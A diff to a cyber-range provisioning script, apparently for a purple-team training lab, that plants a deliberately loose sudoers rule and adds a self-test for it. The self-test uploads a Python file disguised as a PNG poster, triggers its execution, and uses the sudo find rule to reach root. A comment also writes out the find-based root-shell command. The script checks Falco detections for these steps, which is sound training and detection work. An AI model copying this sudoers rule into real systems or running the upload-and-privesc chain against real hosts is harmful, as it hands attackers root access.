@@ -185,6 +185,29 @@ RestartSec=2
 WantedBy=multi-user.target
 UNIT
 
+echo "--- 3.5/6 CH2 Foothold（校園海報上傳，#153）：低權限 render 帳號 + 誤設 sudoers ---"
+# posterrender：app.py 的 /poster/render 把「.py 範本」子行程 preexec_fn 降到這個帳號
+# 執行（見 app.py `_drop_privileges_to_posterrender`），而不是直接繼承
+# range-target-app 本身的 root。--system --no-create-home --shell nologin：純服務帳號，
+# 不該被拿來互動登入。
+useradd --system --no-create-home --shell /usr/sbin/nologin posterrender
+
+mkdir -p /var/lib/purplescope/posters
+chown posterrender:posterrender /var/lib/purplescope/posters
+chmod 0755 /var/lib/purplescope/posters
+
+# 這是 CH2 的提權漏洞本身（T1548，GTFOBins find 型態），不是不小心寫錯：
+# find 的引數完全沒鎖死，`sudo find /var/lib/purplescope/posters -exec /bin/sh \; -quit`
+# 就是現成的 root shell。立意（讓 posterrender 能清理自己的快取目錄）是好的，執行
+# 是壞的——這正是 CH2 想示範的那種「防禦看似存在，其實不夠」。
+# visudo -c 驗證：sudoers 語法錯誤會讓**整台機器**的 sudo 全部失效，這裡故意留漏洞，
+# 但不能留一個連 sudo 本身都打不開的語法錯誤，那就不是提權漏洞而是斷網等級的自爆。
+cat > /etc/sudoers.d/purplescope-poster <<'SUDOERS'
+posterrender ALL=(root) NOPASSWD: /usr/bin/find /var/lib/purplescope/posters *
+SUDOERS
+chmod 0440 /etc/sudoers.d/purplescope-poster
+visudo -c -f /etc/sudoers.d/purplescope-poster
+
 echo "--- 4/6 response agent（target 主動 pull；不開 inbound socket）---"
 apt-get "${APT_OPTS[@]}" install -y -q ipset iptables
 cat > /etc/systemd/system/purplescope-response-agent.service <<'UNIT'
@@ -324,6 +347,32 @@ EXEC_HITS=$(grep -c "PurpleScope exec detected" /var/log/falco/events.json 2>/de
 SEC_HITS=$(grep -c "PurpleScope sensitive file access" /var/log/falco/events.json 2>/dev/null || echo 0)
 UNCOV_HITS=$(grep -c "PurpleScope uncovered action" /var/log/falco/events.json 2>/dev/null || echo 0)
 echo "=== GOLDEN-RULE-HITS: exec=$EXEC_HITS secret=$SEC_HITS uncovered=$UNCOV_HITS ==="
+
+# CH2 Foothold 自證（票 #153）：不是只驗規則檔語法，是**真的走一次攻擊鏈**——
+# 上傳一支偽裝成 image/png 的 .py「海報」、打 render 讓它真的被執行、再以
+# posterrender 身分真的觸發那條誤設的 sudo find 規則拿到 root。三件事都要在
+# bake 期成立，golden 才算真的可利用（不是規則檔寫對了但行為對不上）。
+CH2_MARKER="golden-selfcert-$$"
+curl -s -m 5 -X POST "http://127.0.0.1/poster/upload?filename=selfcert.py" \
+  -H "Content-Type: image/png" \
+  --data-binary "print('${CH2_MARKER}')" >/dev/null || true
+curl -s -m 5 "http://127.0.0.1/poster/render?name=selfcert.py" >/dev/null || true
+sleep 3
+WEBSHELL_HITS=$(grep -c "PurpleScope webshell exec detected" /var/log/falco/events.json 2>/dev/null || echo 0)
+
+# 真的以 posterrender 身分打那條 GTFOBins find 規則，看是不是真的能到 root——
+# 這條**必須成功**：失敗就代表 CH2 的提權腳沒接上，攻擊鏈斷在這一步。
+set +e
+PRIVESC_WHOAMI=$(sudo -u posterrender sudo -n find /var/lib/purplescope/posters \
+  -maxdepth 0 -exec whoami \; 2>&1)
+PRIVESC_RC=$?
+set -e
+sleep 3
+PRIVESC_HITS=$(grep -c "PurpleScope poster sudo find abuse" /var/log/falco/events.json 2>/dev/null || echo 0)
+echo "=== GOLDEN-CH2-STATE: webshell_hits=$WEBSHELL_HITS privesc_whoami=$PRIVESC_WHOAMI privesc_rc=$PRIVESC_RC privesc_falco_hits=$PRIVESC_HITS ==="
+if [ "$PRIVESC_WHOAMI" != "root" ]; then
+  echo "!! CH2 提權自證失敗：posterrender 透過 sudo find 沒能拿到 root（見上面 GOLDEN-CH2-STATE）"
+fi
 
 # 授權邊界自證（票 #44）：光靠 app 帳號 webapp 拿不到 flag，才叫「未經利用拿不到 flag」。
 # 這是**結構性**保證 —— flag 讀不到不是因為 app 沒寫那條路由，是因為 webapp 對 vault 沒 grant。
